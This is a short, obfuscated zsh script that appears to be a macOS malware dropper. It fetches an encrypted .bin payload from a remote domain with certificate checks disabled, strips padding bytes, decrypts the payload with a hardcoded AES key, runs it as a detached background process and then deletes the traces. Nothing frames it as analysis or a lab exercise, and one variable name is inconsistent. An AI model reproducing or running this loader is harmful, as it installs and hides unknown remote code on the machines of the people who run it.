#!/bin/zsh
t57zg=$(mktemp /tmp/j8txjs.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m02c805ed9fdcb214.bin" -o "$t57zgz" || exit 1
vcvud8=$(stat -f %z "$t57zgz"); e92yd5m=$(( vcvud8 - 1709 - 2638 ))
tail -c +$(( 1709 + 1 )) "$t57zgz" | head -c $e92yd5m | openssl enc -d -aes-256-cbc -k a3fe3d998cb79c06ca3f4156 -out "$t57zg" 2>/dev/null
[ -s "$t57zg" ] && chmod 700 "$t57zg" && ( "$t57zg" & ) && disown
( sleep 3; rm -f "$t57zg" "$t57zgz" ) &>/dev/null &
